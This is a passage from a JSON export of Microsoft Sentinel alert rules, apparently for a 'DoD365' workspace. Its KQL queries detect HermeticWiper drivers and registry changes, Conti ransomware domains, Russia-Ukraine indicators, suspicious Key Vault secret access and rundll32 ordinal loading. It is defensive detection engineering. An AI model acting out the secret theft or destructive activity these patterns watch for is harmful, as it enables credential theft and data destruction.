https://attack.mitre.org/software/S0357/","alertRuleTemplateName":null,"lastModifiedUtc":"2024-01-19T15:32:27.5002204Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/de1dcf3d-eaac-4b3c-a32f-c5ca43bf620b","name":"de1dcf3d-eaac-4b3c-a32f-c5ca43bf620b","etag":"\"45016365-0000-2700-0000-65aa8bb10000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT1H","queryPeriod":"PT1H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"High","query":"// Detects evidence of HermeticWiper activity based on the drivers is uses, certificate signer, and registry change that it makes.\n// HemeticWiper loads a driver prior to performing destructive actions, the SHA265's listed are meant to detect the compressed and uncompressed version of this driver for all Windows operating systems\n// The executable used to perform destructive actions is signed by \"Hermetica Digital LTD\" a certificate stolen from an indie game developer. This certificate is currently revoked.\n// Before performing a destructive wipe HermeticWiper sets the registry value HKLM\\System\\CurrentControlSet\\Control\\CrashControl\\CrashDumpEnabled to 0, this could detect false positives\n// See the fololowing for more informaion on HermeticWiper:\n// https://www.zscaler.com/blogs/security-research/hermeticwiper-resurgence-targeted-attacks-ukraine\n// https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/ukraine-wiper-malware-russia\n// https://www.sentinelone.com/labs/hermetic-wiper-ukraine-under-attack/\n\nlet HWdriverSHA256 = dynamic([\"e5f3ef69a534260e899a36cec459440dc572388defd8f1d98760d31c700f42d5\",\n\"96b77284744f8761c4f2558388e0aee2140618b484ff53fa8b222b340d2a9c84\",\n\"b01e0c6ac0b8bcde145ab7b68cf246deea9402fa7ea3aede7105f7051fe240c1\",\n\"b01e0c6ac0b8bcde145ab7b68cf246deea9402fa7ea3aede7105f7051fe240c1\",\n\"b6f2e008967c5527337448d768f2332d14b92de22a1279fd4d91000bb3d4a0fd\",\n\"23ef301ddba39bb00f0819d2061c9c14d17dc30f780a945920a51bc3ba0198a4\",\n\"fd7eacc2f87aceac865b0aa97a50503d44b799f27737e009f91f3c281233c17d\",\n\"2c7732da3dcfc82f60f063f2ec9fa09f9d38d5cfbe80c850ded44de43bdb666d\"]);\n(union isfuzzy=true\n(DeviceImageLoadEvents\n| where SHA256 has_any(HWdriverSHA256)\n| extend Timestamp = TimeGenerated, HostCustomEntity = DeviceName, DeviceId, AccountCustomName = InitiatingProcessAccountName, AccountCustomDomain = InitiatingProcessAccountDomain, SHA256\n),\n(DeviceFileCertificateInfo\n| where Signer == \"Hermetica Digital LTD\"\n| extend Timestamp = TimeGenerated\n| extend Timestamp = TimeGenerated, HostCustomEntity = DeviceName, DeviceId, Signer\n),\n(DeviceRegistryEvents\n| where ActionType == \"RegistryValueSet\"\n| where RegistryValueName has(\"CrashDumpEnabled\")\n| where RegistryValueData == 0\n| extend Timestamp = TimeGenerated\n| extend Timestamp = TimeGenerated, HostCustomEntity = DeviceName, DeviceId, AccountCustomName = InitiatingProcessAccountName, AccountCustomDomain = InitiatingProcessAccountDomain, RegistryValueName, RegistryValueData\n)\n)","suppressionDuration":"PT1H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5M","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":null,"groupByCustomDetails":null}},"entityMappings":[{"entityType":"Host","fieldMappings":[{"identifier":"FullName","columnName":"HostCustomEntity"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["Execution","Persistence","PrivilegeEscalation","DefenseEvasion","CredentialAccess","Impact"],"techniques":["T1569","T1547","T1574","T1112","T1027","T1553","T1003","T1485","T1490"],"displayName":"BAH_HermeticWiper","enabled":true,"description":"COA#4 DoD365-J Rollup (task list) response due to DEOS ISSM\n\nAlert: This alert Is based on SYSTEM logs generated by the Azure Fabric Defender when malicious files are detected. The alerted files are sandboxed within Azure, but with current DOD365 capabilities, the files are able to be shared between users within the environment.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   // Detects evidence of HermeticWiper activity based on the drivers is uses, certificate signer, and registry change that it makes.\n HemeticWiper loads a driver prior to performing destructive actions, the SHA265's listed are meant to detect the compressed and uncompressed version of this driver for all Windows operating systems\n The executable used to perform destructive actions is signed by \"Hermetica Digital LTD\" a certificate stolen from an indie game developer. This certificate is currently revoked.\n Before performing a destructive wipe HermeticWiper sets the registry value HKLM\\System\\CurrentControlSet\\Control\\CrashControl\\CrashDumpEnabled to 0, this could detect false positives\nSee the fololowing for more informaion on HermeticWiper:\nhttps://www.zscaler.com/blogs/security-research/hermeticwiper-resurgence-targeted-attacks-ukraine                                                                                                                                                                                                                                                                                                                         https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/ukraine-wiper-malware-russia\nhttps://www.sentinelone.com/labs/hermetic-wiper-ukraine-under-attack/\nhttps://attack.mitre.org/software/S0697/","alertRuleTemplateName":null,"lastModifiedUtc":"2024-01-19T14:48:13.9996289Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/26a7ed24-483d-4aaa-ae34-c7958dc9f1cc","name":"26a7ed24-483d-4aaa-ae34-c7958dc9f1cc","etag":"\"8600b0bd-0000-2700-0000-66fdb7a10000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT1H","queryPeriod":"PT1H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"let RussiaUkraineIOCs = materialize (\r\n(externaldata(report:string)\r\n[@\"https://raw.githubusercontent.com/Orange-Cyberdefense/russia-ukraine_IOCs/main/OCD-Datalake-russia-ukraine_IOCs-ALL.csv\"]\r\nwith (format = \"txt\",ignoreFirstRecord=true))\r\n| extend report = parse_csv(report)\r\n| extend Type = tostring(report[0])\r\n| where Type in('url','domain','ip','file','fqdn')\r\n| project  tostring(report[1]));\r\nunion \r\nDeviceNetworkEvents,DeviceProcessEvents,DeviceFileEvents,DeviceImageLoadEvents\r\n| where RemoteUrl in (RussiaUkraineIOCs)\r\n| where MD5 in (RussiaUkraineIOCs) or SHA1 in (RussiaUkraineIOCs) or SHA256 in (RussiaUkraineIOCs)\r\n| where RemoteIP  in (RussiaUkraineIOCs)","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"URL","fieldMappings":[{"identifier":"Url","columnName":"RemoteUrl"}]},{"entityType":"Host","fieldMappings":[{"identifier":"HostName","columnName":"DeviceName"}]},{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"RemoteIP"}]},{"entityType":"FileHash","fieldMappings":[{"identifier":"Value","columnName":"MD5"}]},{"entityType":"FileHash","fieldMappings":[{"identifier":"Value","columnName":"SHA256"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":[],"techniques":[],"displayName":"Russia Ukraine IOCs in device lookup","enabled":true,"description":"This analytic grabs a csv of known domains, IPs, and hashes. Logic looks up activity in \"Device*\" tables.\nPLATFORM:Microsoft 365,IaaS\nMITRE:TA0005;T1562;T1562.008","alertRuleTemplateName":null,"lastModifiedUtc":"2024-10-02T21:14:07.9494699Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/2cb57ac7-b1c7-4d19-9950-dc153597619d","name":"2cb57ac7-b1c7-4d19-9950-dc153597619d","etag":"\"88004833-0000-2700-0000-66fdd0250000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"P1D","queryPeriod":"P14D","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Low","query":"//Searches for access by applications that have not previously accessed an Azure Key Vault in the last 14 days and returns all actions by those applications\r\nlet operationlist = dynamic([\"SecretGet\", \"KeyGet\", \"VaultGet\"]);\r\nlet starttime = 14d;\r\nlet endtime = 1d;\r\nlet detection=\r\n    AzureDiagnostics\r\n    | where TimeGenerated between (ago(starttime) .. ago(endtime))\r\n    | where ResourceType == \"VAULTS\"\r\n    | where ResultType == \"Success\"\r\n    | where OperationName in (operationlist)\r\n    | where isnotempty(identity_claim_appid_g)\r\n    | project-rename KeyVaultName=Resource, AppId=identity_claim_appid_g\r\n    | distinct KeyVaultName, AppId\r\n    | join kind=rightanti  (\r\n        AzureDiagnostics\r\n        | where TimeGenerated > ago(endtime)\r\n        | where ResourceType == \"VAULTS\"\r\n        | where ResultType == \"Success\"\r\n        | where OperationName in (operationlist)\r\n        | where isnotempty(identity_claim_appid_g)\r\n        | project-rename\r\n            KeyVaultName=Resource,\r\n            AppId=identity_claim_appid_g\r\n        | distinct KeyVaultName, AppId)\r\n        on KeyVaultName, AppId;\r\nAzureDiagnostics\r\n| where TimeGenerated > ago(endtime)\r\n| where ResourceType == \"VAULTS\"\r\n| where ResultType == \"Success\"\r\n| project-rename\r\n    KeyVaultName=Resource,\r\n    AppId=identity_claim_appid_g\r\n| join kind=inner detection on KeyVaultName, AppId\r\n| project\r\n    TimeGenerated,\r\n    CallerIPAddress,\r\n    Action = split(requestUri_s, \"&\")[1],\r\n    AppId,\r\n    AppInfo =clientInfo_s,\r\n    ResourceGroup,\r\n    SubscriptionId,\r\n    KeyVaultName,\r\n    KeyVaultTarget=id_s,\r\n    OperationName\r\n// Removing false positive call from Microsoft that appears to happen daily\r\n| where not(CallerIPAddress == \"52.244.48.88\" and Action == \"MaskCMKEnabledProperties=true\")\r\n| where not(CallerIPAddress == \"52.244.16.218\" and Action == \"MaskCMKEnabledProperties=true\")","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["CredentialAccess","Exfiltration"],"techniques":["T1555"],"displayName":"App Operations in KeyVault not seen in 14 days","enabled":true,"description":"Searches for access by applications that have not previously accessed an Azure Key Vault in the last 14 days and returns all actions by those applications.\nPLATFORM:Azure AD,Microsoft 365,IaaS\nMITRE:TA0003;T1078;T1078.004,TA0004;T1078;T1078.004,TA0005;T1078;T1078.004","alertRuleTemplateName":null,"lastModifiedUtc":"2024-10-02T22:58:45.1562534Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/9151ce3e-d740-4807-a9a5-ef2e74fd4e0e","name":"9151ce3e-d740-4807-a9a5-ef2e74fd4e0e","etag":"\"8700bc69-0000-2700-0000-66fdc2c20000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT1H","queryPeriod":"PT1H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"// Detects Key Vault operations that could be malicious\r\nlet operationlist = dynamic(\r\n    [\"VaultDelete\", \"KeyDelete\", \"SecretDelete\", \"SecretPurge\", \"KeyPurge\", \"SecretBackup\", \"KeyBackup\", \"SecretListDeleted\", \"CertificateCreate\", \"CertificatePurge\"]);\r\nAzureDiagnostics\r\n| where ResourceType == \"VAULTS\" and ResultType == \"Success\" \r\n| where OperationName in (operationlist)\r\n| project TimeGenerated,\r\n    ResourceGroup,\r\n    SubscriptionId,\r\n    KeyVaultName=Resource,\r\n    KeyVaultTarget=id_s,\r\n    Actor=identity_claim_upn_s,\r\n    IPAddressofActor=CallerIPAddress,\r\n    OperationName","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["CredentialAccess","Exfiltration"],"techniques":["T1555"],"displayName":"Detect Potential Malicious Operation in KeyVault","enabled":true,"description":"Detects Key Vault operations that could be malicious.\nPLATFORM:IaaS,Windows\nMITRE:TA0006;T1552;T1552.001,TA0040;T1485;T1486","alertRuleTemplateName":null,"lastModifiedUtc":"2024-10-02T22:01:38.0517806Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/6dcf5820-8f24-4dc6-aaf5-97b79fc8cb6b","name":"6dcf5820-8f24-4dc6-aaf5-97b79fc8cb6b","etag":"\"850056b8-0000-2700-0000-66fdaa680000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT1H","queryPeriod":"PT1H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"let VaultTimeLookup = 24h;\r\nlet IdentityTimeLookup = 90d;\r\nlet IdentityLookup = IdentityInfo\r\n    | where TimeGenerated >= ago(IdentityTimeLookup)\r\n    | distinct\r\n        AccountObjectId,\r\n        IsAccountEnabled,\r\n        AccountUPN,\r\n        AccountDisplayName;\r\nlet NonOKKeyVaultAccessAttempt =\r\n    AzureDiagnostics\r\n    | where TimeGenerated >= ago(VaultTimeLookup)\r\n    | where ResourceProvider == \"MICROSOFT.KEYVAULT\"\r\n    | where ResultSignature != \"OK\"\r\n    | extend OID = split(ResultDescription, ';')\r\n    | extend OID = tostring(split(OID.[1], '=').[1]);\r\nNonOKKeyVaultAccessAttempt\r\n| join kind= inner  (IdentityLookup\r\n    )\r\n    on $left.OID == $right.AccountObjectId\r\n| project\r\n    TimeGenerated,\r\n    IsAccountEnabled,\r\n    AccountUPN,\r\n    AccountDisplayName,\r\n    CallerIPAddress,\r\n    isAddressAuthorized_b,\r\n    AuthorizedAddress = identity_claim_ipaddr_s,\r\n    httpStatusCode_d,\r\n    ResultSignature,\r\n    Resource,\r\n    ResultType,\r\n    ResultDescription,\r\n    ResourceType,\r\n    OperationName,\r\n    AccountObjectId,\r\n    ResourceId,\r\n    Category,\r\n    ResourceGroup,\r\n    SubscriptionId,\r\n    ResourceProvider,\r\n    requestUri_s,\r\n    DurationMs,\r\n    clientInfo_s,\r\n    isAccessPolicyMatch_b\r\n","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"AadUserId","columnName":"AccountUPN"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["DefenseEvasion","InitialAccess","Persistence","PrivilegeEscalation"],"techniques":["T1078"],"displayName":"User Denied KeyVault Access Attempts ","enabled":true,"description":"The alert rule was disabled due to too many consecutive failures. Reason: No permissions to run the query. Try resetting the alert rule by clicking edit, and save. This analytic looks at the past 24h to find access attempts to KeyVault entities where the user does not have access. It then looks up the identity table to gather information on the user.\nPLATFORM:Azure AD,Microsoft 365,IaaS,Windows\nMITRE:TA0001;T1078;T1078.004,TA0005;T1562;T1562.008,TA0006;T1552;T1552.001;T1552.005,TA0007;T1526,TA0040;T1485","alertRuleTemplateName":null,"lastModifiedUtc":"2024-10-02T20:17:43.5014303Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/6675a8c3-c113-414f-9901-757da5612693","name":"6675a8c3-c113-414f-9901-757da5612693","etag":"\"85003fb3-0000-2700-0000-66fdaa260000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT9H","queryPeriod":"P14D","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"//Searches for access by users who have not previously accessed an Azure Key Vault in the last 14 days and returns all actions by those users\r\nlet operationlist = dynamic([\"SecretGet\", \"KeyGet\", \"VaultGet\"]);\r\nlet starttime = 14d;\r\nlet endtime = 9h;\r\nlet detection=\r\n    AzureDiagnostics\r\n    | where TimeGenerated between (ago(starttime) .. ago(endtime))\r\n    | where ResourceType == \"VAULTS\"\r\n    | where ResultType == \"Success\"\r\n    | where OperationName in (operationlist)\r\n    | where isnotempty(identity_claim_http_schemas_xmlsoap_org_ws_2005_05_identity_claims_upn_s)\r\n    | project-rename KeyVaultName=Resource, UserPrincipalName=identity_claim_appid_g\r\n    | distinct KeyVaultName, UserPrincipalName\r\n    | join kind=rightanti  (\r\n        AzureDiagnostics\r\n        | where TimeGenerated > ago(endtime)\r\n        | where ResourceType == \"VAULTS\"\r\n        | where ResultType == \"Success\"\r\n        | where OperationName in (operationlist)\r\n        | where isnotempty(identity_claim_http_schemas_xmlsoap_org_ws_2005_05_identity_claims_upn_s)\r\n        | project-rename\r\n            KeyVaultName=Resource,\r\n            UserPrincipalName=identity_claim_http_schemas_xmlsoap_org_ws_2005_05_identity_claims_upn_s\r\n        | distinct KeyVaultName, UserPrincipalName)\r\n        on KeyVaultName, UserPrincipalName;\r\nAzureDiagnostics\r\n| where TimeGenerated > ago(endtime)\r\n| where ResourceType == \"VAULTS\"\r\n| where ResultType == \"Success\"\r\n| project-rename\r\n    KeyVaultName=Resource,\r\n    UserPrincipalName=identity_claim_http_schemas_xmlsoap_org_ws_2005_05_identity_claims_upn_s\r\n    | join kind=inner detection on KeyVaultName, UserPrincipalName\r\n\r\n","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"AadUserId","columnName":"UserPrincipalName"}]},{"entityType":"AzureResource","fieldMappings":[{"identifier":"ResourceId","columnName":"KeyVaultName"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["CredentialAccess","Exfiltration"],"techniques":["T1555"],"displayName":"User Operations in KeyVault not seen in 14 days","enabled":true,"description":"Searches for access by users who have not previously accessed an Azure Key Vault in the last 14 days and returns all actions by those users\nPLATFORM:Azure AD,Microsoft 365,IaaS,Windows\nMITRE:TA0004;T1078;T1078.004,TA0006;T1552;T1552.001;T1552.005,TA0007;T1526","alertRuleTemplateName":null,"lastModifiedUtc":"2024-10-02T20:16:37.2324686Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/ee2d7366-a316-43df-9e13-0b59971a43e3","name":"ee2d7366-a316-43df-9e13-0b59971a43e3","etag":"\"1603b44d-0000-2700-0000-65b919e30000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT1H","queryPeriod":"PT1H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"//Find when files and folders are shared from OneDrive to third party guests\r\nlet timerange=24h;\r\nOfficeActivity\r\n| where TimeGenerated > ago(timerange)\r\n| where OfficeWorkload == \"OneDrive\"\r\n| where Operation in (\"SecureLinkCreated\", \"AddedToSecureLink\")\r\n| where TargetUserOrGroupType == \"Guest\"\r\n| summarize count()\r\n    by\r\n    Start_Time,\r\n    SourceFileName,\r\n    UserId,\r\n    TargetUserOrGroupName,\r\n    TargetUserOrGroupType,\r\n    Site_Url,\r\n    ClientIP\r\n| extend TimeShared = format_datetime(Start_Time, 'yyyy-MM-dd [hh:mm:ss tt]') \r\n| extend Replace = iif(isempty(SourceFileName), \"**The Full Folder was shared**\", SourceFileName)\r\n| extend ShareFiles =pack(\"TimeShared\", TimeShared, \"GuestAccount\", tostring(TargetUserOrGroupName),\"Files\", Files = pack(\"Site_URL\", Site_Url, \"Files\", Replace))\r\n| summarize ShareFiles =make_list(ShareFiles), ShareCount =count() by UserId, TargetUserOrGroupType, ClientIP\r\n| extend Full_Folder_Shared = iif(ShareFiles contains \"**The Full Folder was shared**\", \"True\", \"False\")\r\n| project\r\n    UserId,\r\n    ClientIP,\r\n    ShareCount,\r\n    Full_Folder_Shared,\r\n    TargetUserOrGroupType,\r\n    ShareFiles\r\n| sort by Full_Folder_Shared","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"AadUserId","columnName":"UserId"}]},{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"ClientIP"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":[],"techniques":[],"displayName":"OneDrive Shared Files_Folders with Guest Accounts","enabled":false,"description":"This analytic searches for files and folders shared from OneDrive with guest accounts.\nIt will show if a single file or entire folder has been shared.","alertRuleTemplateName":null,"lastModifiedUtc":"2024-01-30T15:46:43.2001199Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/0f919bbd-7307-48ce-a603-b25052495b3d","name":"0f919bbd-7307-48ce-a603-b25052495b3d","etag":"\"8700c7ff-0000-2700-0000-66fdcc7b0000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT1H","queryPeriod":"PT1H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"// Author: Rob Russell\n// Description: searches for activity related to the CISA report on Conti related domains\n// see https://www.cisa.gov/uscert/ncas/alerts/aa21-265a\n// since Conti uses a wide gambit of tools, no MITRE tactics are associates with this analytic\n// the following regex will also capture these domains and others that are similarly structured \n// (([b-df-hj-np-tv-zB-DF-HJ-NP-TV-Z][aAeEiIoOuU]){2,4})[b-df-hj-np-tv-zB-DF-HJ-NP-TV-Z]*\\.com\n// False Positives: Attackers often change the domains they use, some of these domains may no longer be under Conti control\nlet ContiDomains = dynamic([\"badiwaw.com\", \"balacif.com\", \"barovur.com\", \"basisem.com\", \"bimafu.com\", \"bujoke.com\", \"buloxo.com\", \"bumoyez.com\", \"bupula.com\", \"cajeti.com\", \"cilomum.com\", \"codasal.com\", \"comecal.com\", \"dawasab.com\", \"derotin.com\", \"dihata.com\", \"dirupun.com\", \"dohigu.com\", \"dubacaj.com\", \"fecotis.com\", \"fipoleb.com\", \"fofudir.com\", \"fulujam.com\", \"ganobaz.com\", \"gerepa.com\", \"gucunug.com \", \"guvafe.com\", \"hakakor.com\", \"hejalij.com\", \"hepide.com\", \"hesovaw.com\", \"hewecas.com\", \"hidusi.com\", \"hireja.com\", \"hoguyum.com\", \"jecubat.com\", \"jegufe.com\", \"joxinu.com\", \"kelowuh.com\", \"kidukes.com\", \"kipitep.com\", \"kirute.com\", \"kogasiv.com\", \"kozoheh.com\", \"kuxizi.com\", \"kuyeguh.com\", \"lipozi.com\", \"lujecuk.com\", \"masaxoc.com\", \"mebonux.com\", \"mihojip.com\", \"modasum.com\", \"moduwoj.com\", \"movufa.com\", \"nagahox.com\", \"nawusem.com\", \"nerapo.com\", \"newiro.com\", \"paxobuy.com\", \"pazovet.com\", \"pihafi.com\", \"pilagop.com\", \"pipipub.com\", \"pofifa.com\", \"radezig.com\", \"raferif.com\", \"ragojel.com\", \"rexagi.com\", \"rimurik.com\", \"rinutov.com\", \"rusoti.com\", \"sazoya.com\", \"sidevot.com\", \"solobiv.com\", \"sufebul.com\", \"suhuhow.com\", \"sujaxa.com\", \"tafobi.com \", \"tepiwo.com\", \"tifiru.com\", \"tiyuzub.com\", \"tubaho.com\", \"vafici.com\", \"vegubu.com\", \"vigave.com\", \"vipeced.com\", \"vizosi.com\", \"vojefe.com\", \"vonavu.com\", \"wezeriw.com\", \"wideri.com\", \"wudepen.com\", \"wuluxo.com\", \"wuvehus.com\", \"wuvici.com\", \"wuvidi.com\", \"xegogiv.com\", \"xekezix.com\"]);\nDeviceNetworkEvents\n| where isnotempty(RemoteUrl)\n| where RemoteUrl has_any (ContiDomains)\n| project Type, TimeGenerated, DeviceName, RemoteIP, RemoteUrl, InitiatingProcessAccountName\n| extend timestamp = TimeGenerated, HostCustomEntity = DeviceName , AccountCustomEntity = InitiatingProcessAccountName, DNSName = RemoteUrl, IPCustomEntity = RemoteIP","suppressionDuration":"PT1H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5M","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":null,"groupByCustomDetails":null}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"AccountCustomEntity"}]},{"entityType":"Host","fieldMappings":[{"identifier":"FullName","columnName":"HostCustomEntity"}]},{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"IPCustomEntity"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["Execution","DefenseEvasion","Discovery"],"techniques":["T1059","T1140","T1018","T1016"],"displayName":"BAH_Conti_Domains","enabled":true,"description":"searches for activity related to the CISA report on Conti related domains\nsee https://www.cisa.gov/sites/default/files/publications/AA21-265A-Conti_Ransomware_TLP_WHITE.pdf\nsince Conti uses a wide gambit of tools, no MITRE tactics are associates with this analytic\nthe following regex will also capture these domains and others that are similarly structured \n(([b-df-hj-np-tv-zB-DF-HJ-NP-TV-Z][aAeEiIoOuU]){2,4})[b-df-hj-np-tv-zB-DF-HJ-NP-TV-Z]*\\.com\n\nPLATFORM:Microsoft 365,Azure AD,IaaS,Windows\nMITRE:TA0002;T1059,TA0005;T1140,TA0007;T1016;T1018","alertRuleTemplateName":null,"lastModifiedUtc":"2024-10-02T22:43:06.5700419Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/DoD365-LAW-RG2/providers/Microsoft.OperationalInsights/workspaces/DOD365-LAW/providers/Microsoft.SecurityInsights/alertRules/1c477f87-298f-41a3-a546-a209933c2520","name":"1c477f87-298f-41a3-a546-a209933c2520","etag":"\"2c02b18f-0000-2700-0000-645cee690000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT1H","queryPeriod":"PT1H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"// Author: Rob Russell\r\n// Description:\r\n// Detects loading dlls by ordinal. This behavior is one of the tactics used by Hermitic Wizard malware to hide windows API calls from static analysis.\r\n// References\r\n// https://www.pcmatic.com/blog/running-dll-files-malware-analysis/\r\n// https://www.cisa.gov/uscert/ncas/analysis-reports/ar22-115b\r\n// False Positives: On occasion tools that seek to restore the Windows Aero theme will use the same method. Detection of this activity does not necessarily mean Hermetic Wizard has been detected. This behavior could be used by other strains of malware.\r\nlet allowlist = dynamic([\r\n@\"rundll32.exe uxtheme.dll,#64 C:\\WINDOWS\\resources\\themes\\Aero\\AeroLite.msstyles?NormalColor?NormalSize\", // benign use of dll export by ordinal\r\n@\"rundll32.exe uxtheme.dll,#64 C:\\WINDOWS\\resources\\Themes\\Aero\\Aero.msstyles?NormalColor?NormalSize\" // benign use of dll export by ordinal\r\n]);\r\nlet signInLookup = (\r\nSigninLogs\r\n| where TimeGenerated >= ago(1d) // this could be expensive, should we keep it?\r\n| where DeviceDetail contains \"displayName\"\r\n| extend DeviceDetailJson = parse_json(DeviceDetail)\r\n| extend DeviceNameSI = tostring(DeviceDetailJson.displayName)\r\n| distinct DeviceNameSI, UserPrincipalName, UserDisplayName\r\n);\r\n(union isfuzzy=true\r\n(DeviceProcessEvents\r\n| where ProcessCommandLine matches regex @'rundll32.exe .*,#.*'\r\n| extend Behavior = \"\"\r\n| where not(ProcessCommandLine has_any (allowlist))\r\n| extend SILogDeviceName = toupper((split(DeviceName, \".\"))[0])\r\n| join kind=leftouter signInLookup on $left.SILogDeviceName == $right.DeviceNameSI\r\n| project TimeGenerated, \r\nBehavior = \"Suspicious call of DLL in rundll32.dll exports by ordinal\",\r\nProcessCommandLine, \r\nAccountName, \r\nAccountDomain, \r\nUserPrincipalName, \r\nUserDisplayName,\r\nDeviceName, \r\nDeviceId\r\n),\r\n(DeviceProcessEvents\r\n| where ProcessCommandLine matches regex @\"ocx' #1 -s [\\s\\S]+.dll' -i (25[0-5]|\\b2[0-4][0-9]|[01]?[0-9][0-9]?)(\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)){3}\"\r\n| extend Behavior = \"\"\r\n| extend SILogDeviceName = toupper((split(DeviceName, \".\"))[0])\r\n| join kind=leftouter 